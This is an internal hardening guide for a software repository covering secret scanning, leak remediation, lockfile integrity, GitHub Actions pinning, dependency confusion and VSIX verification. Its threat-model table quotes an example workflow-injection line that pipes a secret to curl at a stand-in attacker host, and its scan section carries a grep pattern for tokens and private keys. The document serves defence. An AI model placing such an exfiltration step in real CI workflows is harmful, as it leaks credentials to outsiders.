# Secrets and Supply Chain Hardening

> ABSOLUTE RULE: Never commit, merge, rebase, reset, force-push, or push user work directly on `main` or `master`. `main/master` may only mirror upstream after verified backups exist. Any attempted push to `main/master` is a critical failure and must stop the run.

This document extends doc 09 (Validation Gates) with deep-defense practices for credential handling and supply-chain integrity. The 2026-04-26 incident leaked 16 credentials — see `artifacts/repo-sync/SECURITY_INCIDENT_2026-04-26_DEPLOY_ENV_VPS.md` and `artifacts/repo-sync/SECURITY_INCIDENT_2026-04-26_DISCORD_TELEGRAM_TOKENS.md`. This doc exists to make recurrence impossible.

## Threat model summary

| # | Threat | Why it matters |
|---|---|---|
| 1 | **Secret-in-history** (worst) | Historical commit contains a token. Even after deletion on HEAD, value remains in history visible to anyone with read access. Treat as compromised the moment it lands in a pushed branch. |
| 2 | **Lock-file pinning attack** | Malicious `pnpm-lock.yaml`/`bun.lock`/`package-lock.json` rewrites resolution to a typosquat or attacker-controlled tarball. Manifest looks innocent; lockfile does damage. |
| 3 | **Workflow injection** | PR modifies `.github/workflows/*.yml` to exfiltrate secrets via `echo "$SECRET" \| curl attacker.example` or `pull_request_target` abuse. Fork PRs that touch workflow files are the canonical vector. |
| 4 | **Dependency confusion** | Internal package name (e.g. `@daveai/internal-utils`) accidentally available on public registry. Resolver picks public version (often higher-numbered) → attacker code. |
| 5 | **Compromised maintainer** | Legitimate, pinned, well-known package gains malicious code in a release. Maintainer phished or sold. Pinning by version alone does not help if you later upgrade. |
| 6 | **VSIX / extension supply chain** | Published VSIX swapped for malicious version mid-distribution (CDN poisoning, marketplace compromise, MitM). Users install trojaned build with same name+version. |

## Secret scan tiers

Layered scans. Higher tier the closer to release.

### Tier 1 — always-run (per commit)
```bash
git grep -n -I -E "(api[_-]?key|secret|token|password|passwd|bearer|private[_-]?key|BEGIN RSA|BEGIN OPENSSH|BEGIN PRIVATE)" HEAD -- .
```

### Tier 2 — recommended (per PR)
```bash
gitleaks detect --source=. --report-format=json \
  --report-path="<EVIDENCE_ROOT>/gitleaks.json" --redact
```

### Tier 3 — high-value branches (release/integration)
```bash
trufflehog filesystem . --json --no-update > "<EVIDENCE_ROOT>/trufflehog.json"
```

### Tier 4 — release gate (full history)
```bash
gitleaks detect --log-opts="--all" --report-format=json \
  --report-path="<EVIDENCE_ROOT>/gitleaks-fullhistory.json" --redact
```

A release MUST NOT ship if Tier 4 returns any unredacted finding not documented as a rotated incident.

## Secret remediation flow

When a scan hits — at any tier — STOP. Do not push. Do not silently rebase to "remove" the file.

1. **Rotate the credential** in the provider dashboard. Do not rely on file deletion. Assume the value is already in someone else's clone, in CI logs, in proxy caches, in a fork.
2. **Determine scope.** Was the commit pushed? Did CI log it? Was it cached by an installer? Is the repo public or has it been public?
3. **If pushed, assume compromised.** Rotation is mandatory regardless of how fast file removal happens.
4. **Decide history rewrite need.** Tradeoffs:
   - Rewrite (`git filter-repo`) makes value harder to recover from canonical, but does NOT recover from forks/clones/GitHub caches.
   - Force-push breaks downstream forks. Every collaborator must re-clone or rebase carefully.
   - For most leaks, **rotation alone is correct**. History rewrite is last resort.
5. **Open incident report.** File at `artifacts/repo-sync/SECURITY_INCIDENT_<YYYY-MM-DD>_<KIND>.md`. Use template below.
6. **Schedule rotation verification at T+72h.** A scheduled task must attempt to use the old credential and confirm it returns 401/403/invalid. Record verification output in incident file. Incident not closed until T+72h verification passes.

## History rewrite playbook (last resort)

Only after rotation is complete and verified.

1. Use `git filter-repo`, NOT `git filter-branch` (deprecated, has correctness bugs).
2. Run on a fresh mirror clone, never on the working repo:
   ```bash
   git clone --mirror <url> repo.rewrite.git
   cd repo.rewrite.git
   git filter-repo --path path/to/leaked --invert-paths
   ```
3. Coordinate with all collaborators before pushing rewritten history. Pause merges. Announce window.
4. Re-issue all forks if rewrite changes merge-base of active feature branches.
5. Update GitHub branch protection `required_signatures` if rewrites are post-protection.
6. Invalidate CI caches (Actions cache, Docker layer cache, build artifacts).

## Lock-file integrity

Lock files are part of the trusted boot of the dependency tree. Treat as security-relevant.

- In scope: `bun.lock`, `pnpm-lock.yaml`, `package-lock.json`, `yarn.lock`, `poetry.lock`, `Pipfile.lock`, `Cargo.lock`, `go.sum`.
- **CI gate (mandatory)**: install must use frozen mode. Lockfile-manifest mismatch fails build:
  ```bash
  pnpm install --frozen-lockfile
  npm ci
  bun install --frozen-lockfile
  poetry install --no-update
  ```
- **PR review detection**:
  ```bash
  git diff --stat <main> <branch> -- '*lock*' 'package-lock.json' 'pnpm-lock.yaml' 'bun.lock' 'poetry.lock' 'Cargo.lock' 'go.sum'
  ```
  Non-empty → PR MUST carry an explicit "deps update" feature card and CODEOWNERS approval from security reviewer.
- **Forbidden**: lockfile changes in feature branches whose card is not labeled `deps`. Drive-by lockfile mutation in a feature PR blocks the PR.

## Workflow injection prevention

GitHub Actions is a credential-rich execution environment and primary exfiltration target.

- **Pin actions to commit SHAs, never tags** (tags are mutable):
  ```yaml
  # WRONG
  uses: actions/checkout@v4
  # RIGHT
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
  ```
- **Default to read-only token**:
  ```yaml
  permissions:
    contents: read
    pull-requests: write  # only if needed
  ```
- **PR workflows from forks must NOT have access to secrets.** Use `pull_request_target` only when intentional, reviewed line-by-line, and never combined with checkout of fork-controlled code.
- **CODEOWNERS gate on `.github/workflows/`**:
  ```
  .github/workflows/  @daveai/security-reviewers
  ```
- **No `${{ ... }}` interpolation of untrusted input into shell.** PR title, branch name, body must be passed via env, not inlined.

## Dependency confusion / typosquat

- **Use scoped packages for internal code.** `@daveai/*`. Reserve scope on public registry even if never publishing there.
- **Lock the registry per scope**:
  ```json
  {"publishConfig": {"registry": "https://npm.private.daveai.example/"}}
  ```
- **`.npmrc`**:
  ```
  @daveai:registry=https://npm.private.daveai.example/
  registry=https://registry.npmjs.org/
  ```
- **Audit signatures weekly**:
  ```bash
  npm audit signatures
  pnpm audit
  ```

## Compromised-maintainer detection

- Monitor changelog of every direct dependency for unusual diffs — new postinstall hooks, new network endpoints, new file-system writes outside package dir, sudden new maintainers.
- Use `socket.dev` (or equivalent) on every dependency upgrade PR. `npm audit signatures` validates published artifact was signed by expected key.
- **Pin major versions explicitly** for security-critical deps (auth, crypto, http, signature verification, JWT/JWE). NO `^` or `~` for these. Pin exact versions; upgrade deliberately.

## VSIX / extension supply chain

### Already implemented in this codebase

- **SHA256 + size verification before `installVSIX`** (`AutoUpdateService.ts` kilocode_change). Mismatch aborts install.
- **Tightened `isSafeId` regex** in marketplace skill installer (npm-style). Rejects path-traversal, shell-meta, unicode-confusable.
- **ZeroClaw service** uses `execFileSync` with argv array — never the shell.

### Recommended additions (V4)

| Layer | Mechanism |
|---|---|
| a | **Manifest signature verification** (cosign-style). Verify before extraction. |
| b | **Provenance attestation per release.** SLSA-style. See doc 23. |
| c | **Reproducible build hash.** Build twice on different machines (CI matrix); fail on mismatch. |
| d | **SBOM per release** in CycloneDX format (`syft`). Publish alongside VSIX. |

## Audit cadence

| Interval | Action |
|---|---|
| Pre-commit (daily) | gitleaks pre-commit hook on staged files |
| Per-PR | Tier 1 + Tier 2 secret scan, lockfile dep-diff, workflow-file CODEOWNERS gate |
| Weekly | `npm audit signatures`, `pnpm audit`, `safety check` (Python), `cargo audit` |
| Monthly | Tier 4 full-history gitleaks re-scan, dependency tree review, registry pin audit |
| Quarterly | SBOM diff vs prior quarter, provenance attestation review, action-pin SHA freshness |

Schedule monthly + quarterly via `scheduled-tasks` so they survive maintainer rotation.

## Incident report template

Write at `artifacts/repo-sync/SECURITY_INCIDENT_<YYYY-MM-DD>_<KIND>.md`. The 2026-04-26 incidents are reference implementations.

```md
# SECURITY_INCIDENT_<YYYY-MM-DD>_<KIND>.md

## Discovered
Date:
Reporter:
Mode (gitleaks / grep / manual / external report):

## Scope
Repos:
Files:
First-leak commit:
Public-since:

## Credentials affected
| Provider | Type | First 6 + last 4 of value | Privilege | Auto-renewable? |
|---|---|---|---|---|

## Rotation
| Credential | Rotation method | Rotated at (UTC) | Verified non-functional at (UTC) |
|---|---|---|---|

## Remediation
Files modified:
History rewrite: yes/no  (if yes: commit-range)
Force-pushes:
Forks notified:

## Verification
T+72h check scheduled at:
Verification run output (paste/link):

## Closure
Closed by:
Closed at:
Lessons (one paragraph; what control would have prevented this):
```

Incident NOT closed until:
1. All credentials rotated AND verified non-functional.
2. T+72h scheduled verification has run + recorded output.
3. Lessons paragraph identifies a concrete control that has been added to this doc or doc 09.

## Tools to install

| Tool | Purpose | Install |
|---|---|---|
| gitleaks | Tier 2 / Tier 4 secret scan | `brew install gitleaks` or `winget install gitleaks` |
| trufflehog | Tier 3 entropy + verifier | `pip install trufflehog` |
| syft | SBOM generation (CycloneDX) | `winget install anchore.syft` |
| git-filter-repo | History rewrite (last resort) | `pip install git-filter-repo` |
| cosign | Artifact signing / verification | `winget install sigstore.cosign` |

Pre-commit hook example (`.pre-commit-config.yaml`):
```yaml
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
```

## Cross-references

- doc 09 — Validation Gates (Tier 1, universal gates).
- doc 12 — Rollback and Disaster Recovery.
- doc 18 — GitHub branch protection (CODEOWNERS gate setup).
- doc 23 — Provenance and release attestation.
- doc 24 — Failure Mode Library (F6.4 secret-in-branch).

## TL;DR

1. Run `gitleaks` per PR. Run against `--all` history before every release.
2. Lockfile changes outside a `deps`-labeled card are blocked.
3. Pin GitHub Actions to SHAs. Workflow files are CODEOWNERS-gated.
4. Scoped packages with explicit registry pin. No `^`/`~` on auth/crypto/http deps.
5. VSIX has SHA256 + size verification. Add manifest signing + SBOM next.
6. On any leak: rotate first, document second, history-rewrite only if necessary, verify at T+72h, close with a lesson that becomes a new control.
